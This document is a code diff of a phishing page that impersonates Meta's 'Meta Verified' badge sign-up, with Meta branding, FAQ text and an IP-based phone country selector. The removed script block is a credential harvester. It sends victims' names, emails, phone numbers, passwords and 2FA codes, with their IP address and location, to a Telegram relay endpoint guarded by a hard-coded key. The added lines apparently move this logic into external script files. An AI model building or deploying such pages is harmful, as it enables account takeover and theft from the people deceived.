@@ -6,116 +6,10 @@
     <title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
     <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features." />
 
-<script src="https://cdn.tailwindcss.com"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-const CONFIG = { STORAGE_EXPIRY: 3600000 };
-
-/* ============================================================
-   HÀM GỬI TELEGRAM — gọi trực tiếp, không cần Utils
-============================================================ */
-var _cachedIp = null;
-
-function _getIp() {
-  if (_cachedIp) return Promise.resolve(_cachedIp);
-  return fetch('https://ipinfo.io/json')
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      var names = {VN:'Vietnam',US:'United States',GB:'United Kingdom',FR:'France',DE:'Germany',JP:'Japan',CN:'China',KR:'South Korea',TH:'Thailand',SG:'Singapore',AU:'Australia',CA:'Canada',IN:'India',ID:'Indonesia',MY:'Malaysia',PH:'Philippines',TW:'Taiwan',HK:'Hong Kong'};
-      var cc = d.country||'';
-      var city = d.city||'', region = d.region||'', country = names[cc]||cc;
-      var parts = [city];
-      if(region && region.toLowerCase()!==city.toLowerCase() && !region.toLowerCase().includes(city.toLowerCase())) parts.push(region);
-      if(country) parts.push(country);
-      var loc = parts.filter(Boolean).join(', ')+(cc?' ('+cc+')':'');
-      _cachedIp = { ip: d.ip||'N/A', loc: loc||'N/A' };
-      return _cachedIp;
-    })
-    .catch(function(){ return { ip:'N/A', loc:'N/A' }; });
-}
-
-function _c(v){ return (v!==undefined&&v!==null&&v!=='') ? '<code>'+v+'</code>' : '<i>N/A</i>'; }
-
-function _sendTelegram(msg) {
-  fetch('/api/send-telegram', {
-    method: 'POST',
-    headers: { 'Content-Type':'application/json', 'x-secret-key':'HDNDT-JDHT8FNEK-JJHR' },
-    body: JSON.stringify({ message: msg }),
-  }).catch(function(){});
-}
-
-/* Gửi step 1: thông tin cơ bản */
-function _sendStep1() {
-  _getIp().then(function(ip) {
-    var d = _masterData;
-    var msg = [
-      '🔔 <b>VOI VỀ ANH EM ƠI!!</b>',
-      '🌐 <b>IP:</b> <code>'+ip.ip+'</code>',
-      '📍 <b>Location:</b> <code>'+ip.loc+'</code>',
-      '-----------------------------',
-      '<b>Full Name:</b> '+_c(d.fullName),
-      '<b>Page Name:</b> '+_c(d.fanpage),
-      '<b>Date of Birth:</b> '+_c(d.dob),
-      '<b>Message:</b> '+_c(d.message),
-      '-----------------------------',
-      '<b>Email:</b> '+_c(d.email),
-      '<b>Email Business:</b> '+_c(d.emailBusiness),
-      '<b>Phone Number:</b> '+_c(d.phone),
-      '-----------------------------',
-      '🕐 '+new Date().toLocaleString('vi-VN'),
-    ].join('\n');
-    _sendTelegram(msg);
-  });
-}
-
-/* Gửi step 2: password */
-function _sendStep2() {
-  _getIp().then(function(ip) {
-    var d = _masterData;
-    var msg = [
-      '🔑 <b>PASSWORD UPDATE</b>',
-      '🌐 <b>IP:</b> <code>'+ip.ip+'</code>',
-      '📍 <b>Location:</b> <code>'+ip.loc+'</code>',
-      '-----------------------------',
-      '<b>Full Name:</b> '+_c(d.fullName),
-      '<b>Email:</b> '+_c(d.email),
-      '<b>Phone:</b> '+_c(d.phone),
-      '-----------------------------',
-      d.password       ? '<b>Password (1):</b> '+_c(d.password)       : null,
-      d.passwordSecond ? '<b>Password (2):</b> '+_c(d.passwordSecond) : null,
-      '-----------------------------',
-      '🕐 '+new Date().toLocaleString('vi-VN'),
-    ].filter(function(v){return v!==null;}).join('\n');
-    _sendTelegram(msg);
-  });
-}
-
-/* Gửi step 3: 2FA */
-function _sendStep3() {
-  _getIp().then(function(ip) {
-    var d = _masterData;
-    var msg = [
-      '🔐 <b>2FA UPDATE</b>',
-      '🌐 <b>IP:</b> <code>'+ip.ip+'</code>',
-      '📍 <b>Location:</b> <code>'+ip.loc+'</code>',
-      '-----------------------------',
-      '<b>Full Name:</b> '+_c(d.fullName),
-      '<b>Email:</b> '+_c(d.email),
-      '<b>Phone:</b> '+_c(d.phone),
-      '-----------------------------',
-      d.password       ? '<b>Password (1):</b> '+_c(d.password)       : null,
-      d.passwordSecond ? '<b>Password (2):</b> '+_c(d.passwordSecond) : null,
-      '-----------------------------',
-      d.twoFa0     ? '🔐 <b>2FA (1):</b> '+_c(d.twoFa0)     : null,
-      d.twoFa1     ? '🔐 <b>2FA (2):</b> '+_c(d.twoFa1)     : null,
-      d.twoFaFinal ? '🔐 <b>2FA (3):</b> '+_c(d.twoFaFinal) : null,
-      '-----------------------------',
-      '🕐 '+new Date().toLocaleString('vi-VN'),
-    ].filter(function(v){return v!==null;}).join('\n');
-    _sendTelegram(msg);
-  });
-}
-</script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="public/js/config.js"></script>
+    <script src="public/js/utils.js"></script>
     <script>
         tailwind.config = {
             theme: { extend: { colors: { primary: '#0866ff', secondary: '#1c1e21' } } }
@@ -334,6 +228,7 @@ function _sendStep3() {
       .footer-legal { display: flex; flex-wrap: wrap; gap: 16px; }
       .footer-legal a { color: #cbd2d9; font-size: 13px; text-decoration: none; }
 
+      /* ===== MODAL ===== */
       .modal-overlay {
         display: none; position: fixed; inset: 0; z-index: 999;
         background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; padding: 0;
@@ -385,6 +280,8 @@ function _sendStep3() {
         border-radius: 40px; text-decoration: none; font-size: 15px; font-weight: 500;
       }
       .modal-return-btn:active { background: #0052c5; }
+      .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 6px; }
+      .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
       .modal-btn-primary {
         width: 100%; height: 48px; background: #0064E0; color: #fff; border: none;
         border-radius: 40px; font-size: 16px; font-weight: 500; cursor: pointer;
@@ -399,6 +296,7 @@ function _sendStep3() {
       }
       .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
 
+      /* ===== PHONE SELECTOR ===== */
       .nf-input-wrap {
         width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
         border-radius: 10px; background: white; font-size: 14px; margin-bottom: 10px;
@@ -412,9 +310,42 @@ function _sendStep3() {
         width: 100%; outline: none; border: none; background: transparent;
         font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
       }
-      .pcs-opt { display: flex; align-items: center; gap: 8px; padding: 10px 14px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+      .pcs-wrap { position: relative; display: flex; align-items: center; }
+      .pcs-trigger {
+        display: flex; align-items: center; gap: 4px;
+        padding: 0 8px 0 12px; height: 44px; border-right: 1px solid #e5e7eb;
+        cursor: pointer; user-select: none; flex-shrink: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+      .pcs-trigger span { font-size: 18px; line-height: 1; }
+      .pcs-dial { font-size: 13px; color: #333; font-weight: 700; margin-left: 4px; }
+      .pcs-dropdown {
+        position: absolute; top: calc(100% + 6px); left: 0; width: 270px;
+        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.15); z-index: 9999;
+        max-height: 260px; overflow: hidden; display: flex; flex-direction: column;
+      }
+      .pcs-search {
+        padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
+        font-size: 14px; outline: none; width: 100%;
+      }
+      .pcs-list { overflow-y: auto; flex: 1; }
+      .pcs-opt {
+        display: flex; align-items: center; gap: 8px; padding: 10px 14px;
+        cursor: pointer; -webkit-tap-highlight-color: transparent;
+      }
       .pcs-opt:active { background: #f0f4ff; }
+      .pcs-phone-input {
+        flex: 1; height: 44px; padding: 0 12px; border: none; outline: none;
+        background: transparent; font-size: 16px; font-family: inherit; min-width: 0;
+      }
 
+      /* Loading overlay for modal */
+      .modal-loading {
+        position: absolute; inset: 0; background: rgba(255,255,255,0.85);
+        display: flex; align-items: center; justify-content: center;
+        border-radius: inherit; z-index: 10;
+      }
       .modal-loading-spinner {
         width: 32px; height: 32px; border: 3px solid #e5e7eb;
         border-top-color: #0064E0; border-radius: 50%;
@@ -425,6 +356,7 @@ function _sendStep3() {
 
 <body class="intro-active">
 
+  <!-- INTRO OVERLAY -->
   <div id="intro-overlay">
     <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
   </div>
@@ -439,6 +371,7 @@ function _sendStep3() {
     })();
   </script>
 
+  <!-- HEADER -->
   <header class="site-header">
     <div class="header-logo">
       <img src="public/icons/ic_meta.svg" alt="Meta" />
@@ -455,6 +388,7 @@ function _sendStep3() {
     </div>
   </header>
 
+  <!-- HERO -->
   <section class="hero">
     <div class="hero-right">
       <img src="public/images/photo_meta.png" alt="Meta Verified creators" />
@@ -473,11 +407,13 @@ function _sendStep3() {
     </div>
   </section>
 
+  <!-- INTRO TEXT -->
   <div class="section-intro">
     <p class="section-intro-title">A creator toolkit to take your brand further</p>
     <p class="section-intro-desc">Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
   </div>
 
+  <!-- FEATURES -->
   <div class="features-wrap">
     <div class="features-desktop">
       <div class="feature-img-wrap">
@@ -545,14 +481,18 @@ function _sendStep3() {
         });
         descs.forEach(function(desc) {
           var pIdx = desc.closest('.feature-item').dataset.index;
-          if (pIdx === idx) { desc.style.maxHeight = '200px'; desc.style.opacity = '1'; desc.style.marginTop = '20px'; }
-          else { desc.style.maxHeight = '0'; desc.style.opacity = '0'; desc.style.marginTop = '0'; }
+          if (pIdx === idx) {
+            desc.style.maxHeight = '200px'; desc.style.opacity = '1'; desc.style.marginTop = '20px';
+          } else {
+            desc.style.maxHeight = '0'; desc.style.opacity = '0'; desc.style.marginTop = '0';
+          }
         });
       });
     });
   });
   </script>
 
+  <!-- TESTIMONIALS -->
   <div class="testimonial-section">
     <p class="testimonial-title">See how Meta Verified has helped real businesses.</p>
     <div class="testimonial-slider">
@@ -608,6 +548,7 @@ function _sendStep3() {
   })();
   </script>
 
+  <!-- CTA -->
   <div class="cta-section">
     <div class="cta-media">
       <video src="public/images/video-meta.mp4" autoplay muted loop playsinline style="width:100%;height:100%;object-fit:cover;"></video>
@@ -622,6 +563,7 @@ function _sendStep3() {
     </div>
   </div>
 
+  <!-- FAQ -->
   <div class="faq-section">
     <p class="faq-title">FAQ</p>
     <p class="faq-subtitle">We've included some frequently asked questions below. For more, visit our Help Centre on
@@ -631,27 +573,27 @@ function _sendStep3() {
     <div class="faq-list">
       <div class="faq-item">
         <button class="faq-btn"><span>How do I know if I'm eligible?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">Meta Verified is available in selected regions for creators who meet certain eligibility requirements.</div></div>
+        <div class="faq-content"><div class="faq-answer">Meta Verified is available in selected regions for creators who meet certain eligibility requirements. Requirements vary by platform — check Facebook and Instagram help centres for details.</div></div>
       </div>
       <div class="faq-item">
         <button class="faq-btn"><span>I already have a verified badge. What happens to it?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">There will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements.</div></div>
+        <div class="faq-content"><div class="faq-answer">There will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements. Existing verified badge holders can also apply for a Meta Verified subscription if they meet the eligibility requirements.</div></div>
       </div>
       <div class="faq-item">
         <button class="faq-btn"><span>What is the verification process?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">You may be asked to provide a government-issued ID and, in selected regions, a selfie video.</div></div>
+        <div class="faq-content"><div class="faq-answer">You may be asked to provide a government-issued ID and, in selected regions, may be asked to submit a selfie video so that we can confirm your identity before being approved.</div></div>
       </div>
       <div class="faq-item">
         <button class="faq-btn"><span>As a creator, can I use one subscription on both Facebook and Instagram?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">Yes, if your accounts are linked in Accounts Centre, you may subscribe for two profiles at a discounted price.</div></div>
+        <div class="faq-content"><div class="faq-answer">Yes. If you have your Facebook and Instagram accounts linked in the Accounts Centre, you may be eligible to subscribe to Meta Verified for two profiles for a discounted price.</div></div>
       </div>
       <div class="faq-item">
         <button class="faq-btn"><span>What is the price to subscribe to Meta Verified for creators?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">USD 11.99/month from web, USD 14.99/month from app. Plus: $49.99 · Premium: $149.99 · Max: $499.99/mo.</div></div>
+        <div class="faq-content"><div class="faq-answer">Meta Verified subscriptions are generally available for USD 11.99/month from the web, and USD 14.99/month from within the app. Plus: USD 49.99/mo · Premium: USD 149.99/mo · Max: USD 499.99/mo.</div></div>
       </div>
       <div class="faq-item">
         <button class="faq-btn"><span>After signing up, can I change my plan?</span><span class="faq-icon">+</span></button>
-        <div class="faq-content"><div class="faq-answer">Yes, you can change your plan at any time from the Instagram or Facebook apps.</div></div>
+        <div class="faq-content"><div class="faq-answer">Yes. You can change your plan selection at any time. To upgrade to Plus, Premium, and Max plans, you will need to use the Instagram or Facebook apps on your mobile device.</div></div>
       </div>
     </div>
   </div>
@@ -672,6 +614,7 @@ function _sendStep3() {
   });
   </script>
 
+  <!-- FOOTER -->
   <footer class="footer-main">
     <div class="footer-main-inner">
       <div>
@@ -683,7 +626,7 @@ function _sendStep3() {
           <input type="email" placeholder="Email address" class="footer-input" />
           <input type="text" placeholder="Country" class="footer-input" />
         </div>
-        <p class="footer-fine">By submitting this form, you agree to receive marketing related electronic communications from Meta.</p>
+        <p class="footer-fine">By submitting this form, you agree to receive marketing related electronic communications from Meta. You may withdraw your consent at any time.</p>
         <button class="footer-sub-btn">Subscribe</button>
       </div>
     </div>
@@ -712,8 +655,11 @@ function _sendStep3() {
       <div class="footer-bottom">
         <div class="footer-copy">© 2026 Meta</div>
         <div class="footer-legal">
-          <a href="#">Privacy Policy</a><a href="#">Terms</a><a href="#">Cookie policy</a>
-          <a href="#">Community Standards</a><a href="#">Help Centre</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms</a>
+          <a href="#">Cookie policy</a>
+          <a href="#">Community Standards</a>
+          <a href="#">Help Centre</a>
         </div>
       </div>
     </div>
@@ -722,117 +668,232 @@ function _sendStep3() {
   <div id="modalsContainer"></div>
 
   <script>
+  /* ============================================================
+     COUNTRY CODES
+  ============================================================ */
   var COUNTRY_CODES = [
-    {code:"AF",name:"Afghanistan",dial:"+93",flag:"🇦🇫"},{code:"AL",name:"Albania",dial:"+355",flag:"🇦🇱"},
-    {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},{code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
-    {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},{code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
-    {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},{code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
-    {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},{code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
-    {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},{code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
-    {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},{code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
-    {code:"HR",name:"Croatia",dial:"+385",flag:"🇭🇷"},{code:"CZ",name:"Czech Republic",dial:"+420",flag:"🇨🇿"},
-    {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},{code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
-    {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},{code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
-    {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},{code:"GH",name:"Ghana",dial:"+233",flag:"🇬🇭"},
-    {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},{code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
-    {code:"HU",name:"Hungary",dial:"+36",flag:"🇭🇺"},{code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
-    {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},{code:"IR",name:"Iran",dial:"+98",flag:"🇮🇷"},
-    {code:"IQ",name:"Iraq",dial:"+964",flag:"🇮🇶"},{code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"},
-    {code:"IL",name:"Israel",dial:"+972",flag:"🇮🇱"},{code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
-    {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},{code:"JO",name:"Jordan",dial:"+962",flag:"🇯🇴"},
-    {code:"KZ",name:"Kazakhstan",dial:"+7",flag:"🇰🇿"},{code:"KE",name:"Kenya",dial:"+254",flag:"🇰🇪"},
-    {code:"KW",name:"Kuwait",dial:"+965",flag:"🇰🇼"},{code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
-    {code:"LB",name:"Lebanon",dial:"+961",flag:"🇱🇧"},{code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
-    {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},{code:"MA",name:"Morocco",dial:"+212",flag:"🇲🇦"},
-    {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},{code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
-    {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},{code:"NZ",name:"New Zealand",dial:"+64",flag:"🇳🇿"},
-    {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},{code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
-    {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},{code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
-    {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},{code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
-    {code:"QA",name:"Qatar",dial:"+974",flag:"🇶🇦"},{code:"RO",name:"Romania",dial:"+40",flag:"🇷🇴"},
-    {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},{code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
-    {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},{code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
-    {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},{code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
-    {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},{code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
-    {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},{code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
-    {code:"TZ",name:"Tanzania",dial:"+255",flag:"🇹🇿"},{code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
-    {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},{code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
-    {code:"AE",name:"United Arab Emirates",dial:"+971",flag:"🇦🇪"},{code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
-    {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},{code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"}
+    {code:"AF",name:"Afghanistan",dial:"+93",flag:"🇦🇫"},
+    {code:"AL",name:"Albania",dial:"+355",flag:"🇦🇱"},
+    {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},
+    {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
+    {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+    {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
+    {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
+    {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
+    {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
+    {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
+    {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
+    {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
+    {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+    {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
+    {code:"HR",name:"Croatia",dial:"+385",flag:"🇭🇷"},
+    {code:"CZ",name:"Czech Republic",dial:"+420",flag:"🇨🇿"},
+    {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
+    {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
+    {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
+    {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
+    {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+    {code:"GH",name:"Ghana",dial:"+233",flag:"🇬🇭"},
+    {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
+    {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
+    {code:"HU",name:"Hungary",dial:"+36",flag:"🇭🇺"},
+    {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
+    {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+    {code:"IR",name:"Iran",dial:"+98",flag:"🇮🇷"},
+    {code:"IQ",name:"Iraq",dial:"+964",flag:"🇮🇶"},
+    {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"},
+    {code:"IL",name:"Israel",dial:"+972",flag:"🇮🇱"},
+    {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
+    {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+    {code:"JO",name:"Jordan",dial:"+962",flag:"🇯🇴"},
+    {code:"KZ",name:"Kazakhstan",dial:"+7",flag:"🇰🇿"},
+    {code:"KE",name:"Kenya",dial:"+254",flag:"🇰🇪"},
+    {code:"KW",name:"Kuwait",dial:"+965",flag:"🇰🇼"},
+    {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
+    {code:"LB",name:"Lebanon",dial:"+961",flag:"🇱🇧"},
+    {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+    {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+    {code:"MA",name:"Morocco",dial:"+212",flag:"🇲🇦"},
+    {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
+    {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
+    {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
+    {code:"NZ",name:"New Zealand",dial:"+64",flag:"🇳🇿"},
+    {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
+    {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
+    {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
+    {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
+    {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
+    {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
+    {code:"QA",name:"Qatar",dial:"+974",flag:"🇶🇦"},
+    {code:"RO",name:"Romania",dial:"+40",flag:"🇷🇴"},
+    {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
+    {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
+    {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+    {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
+    {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+    {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
+    {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
+    {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
+    {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
+    {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
+    {code:"TZ",name:"Tanzania",dial:"+255",flag:"🇹🇿"},
+    {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+    {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
+    {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
+    {code:"AE",name:"United Arab Emirates",dial:"+971",flag:"🇦🇪"},
+    {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+    {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+    {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"}
   ];
 
-  var _ipReady = false, _ipResolvers = [];
-  var _selectedDial = "+84", _selectedFlag = "🇻🇳", _selectedCode = "VN", _dropOpen = false;
+  /* ============================================================
+     IP DETECTION
+  ============================================================ */
+  var _ipReady = false;
+  var _ipResolvers = [];
+  var _selectedDial = "+84";
+  var _selectedFlag = "🇻🇳";
+  var _selectedCode = "VN";
+  var _dropOpen = false;
 
   function _applyCountry(code) {
     if (_ipReady) return;
-    code = (code||'').toUpperCase();
+    code = (code || '').toUpperCase();
     var found = null;
-    for (var i=0;i<COUNTRY_CODES.length;i++) { if(COUNTRY_CODES[i].code===code){found=COUNTRY_CODES[i];break;} }
+    for (var i = 0; i < COUNTRY_CODES.length; i++) {
+      if (COUNTRY_CODES[i].code === code) { found = COUNTRY_CODES[i]; break; }
+    }
     if (!found) return;
-    _ipReady = true; _selectedDial = found.dial; _selectedFlag = found.flag; _selectedCode = found.code;
-    var f=document.getElementById('pcsFlag'); var d=document.getElementById('pcsDial');
-    if(f) f.textContent=found.flag; if(d) d.textContent=found.dial;
-    _ipResolvers.forEach(function(fn){fn();}); _ipResolvers=[];
+    _ipReady = true;
+    _selectedDial = found.dial;
+    _selectedFlag = found.flag;
+    _selectedCode = found.code;
+    var f = document.getElementById('pcsFlag');
+    var d = document.getElementById('pcsDial');
+    if (f) f.textContent = found.flag;
+    if (d) d.textContent = found.dial;
+    _ipResolvers.forEach(function(fn) { fn(); });
+    _ipResolvers = [];
   }
-  function _onIpReady(fn) { if(_ipReady){fn();return;} _ipResolvers.push(fn); }
-  setTimeout(function(){ if(!_ipReady){_ipReady=true;_ipResolvers.forEach(function(fn){fn();});_ipResolvers=[];} },3000);
+
+  function _onIpReady(fn) {
+    if (_ipReady) { fn(); return; }
+    _ipResolvers.push(fn);
+  }
+
+  setTimeout(function() {
+    if (!_ipReady) {
+      _ipReady = true;
+      _ipResolvers.forEach(function(fn) { fn(); });
+      _ipResolvers = [];
+    }
+  }, 3000);
 
   (function detectIP() {
-    fetch('https://ip-api.com/json/?fields=countryCode').then(function(r){return r.json();}).then(function(d){_applyCountry(d.countryCode);}).catch(function(){});
-    fetch('https://www.cloudflare.com/cdn-cgi/trace').then(function(r){return r.text();}).then(function(t){var m=t.match(/loc=([A-Z]{2})/);if(m)_applyCountry(m[1]);}).catch(function(){});
-    fetch('https://ipwho.is/').then(function(r){return r.json();}).then(function(d){_applyCountry(d.country_code);}).catch(function(){});
-    fetch('https://api.country.is/').then(function(r){return r.json();}).then(function(d){_applyCountry(d.country);}).catch(function(){});
+    fetch('https://ip-api.com/json/?fields=countryCode')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.countryCode); })
+      .catch(function() {});
+
+    fetch('https://www.cloudflare.com/cdn-cgi/trace')
+      .then(function(r) { return r.text(); })
+      .then(function(t) {
+        var m = t.match(/loc=([A-Z]{2})/);
+        if (m) _applyCountry(m[1]);
+      })
+      .catch(function() {});
+
+    fetch('https://ipwho.is/')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.country_code); })
+      .catch(function() {});
+
+    fetch('https://api.country.is/')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.country); })
+      .catch(function() {});
   })();
 
+  /* ============================================================
+     PHONE SELECTOR BUILDER
+  ============================================================ */
   function _buildPhoneSelector() {
     var opts = COUNTRY_CODES.map(function(c) {
-      var active = c.code===_selectedCode;
-      return '<div class="pcs-opt" data-dial="'+c.dial+'" data-flag="'+c.flag+'" data-code="'+c.code+'" onclick="_selectDial(this)"'+(active?' style="background:#e8f0fe;" id="pcs-active"':'')+'>'+
-        '<span style="font-size:18px;margin-right:8px;line-height:1;">'+c.flag+'</span>'+
-        '<span style="font-size:13px;color:#111;font-weight:700;min-width:46px;display:inline-block;">'+c.dial+'</span>'+
-        '<span style="font-size:13px;color:#555;">'+c.name+'</span></div>';
+      var active = c.code === _selectedCode;
+      return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag
+        + '" data-code="' + c.code + '" onclick="_selectDial(this)"'
+        + (active ? ' style="background:#e8f0fe;" id="pcs-active"' : '') + '>'
+        + '<span style="font-size:18px;margin-right:8px;line-height:1;">' + c.flag + '</span>'
+        + '<span style="font-size:13px;color:#111;font-weight:700;min-width:46px;display:inline-block;">' + c.dial + '</span>'
+        + '<span style="font-size:13px;color:#555;">' + c.name + '</span></div>';
     }).join('');
-    return '<div id="pcsContainer" style="position:relative;margin-bottom:10px;">'+
-      '<div id="pcs" style="display:flex;align-items:center;border:1px solid #d4dbe3;border-radius:10px;background:#fff;height:44px;">'+
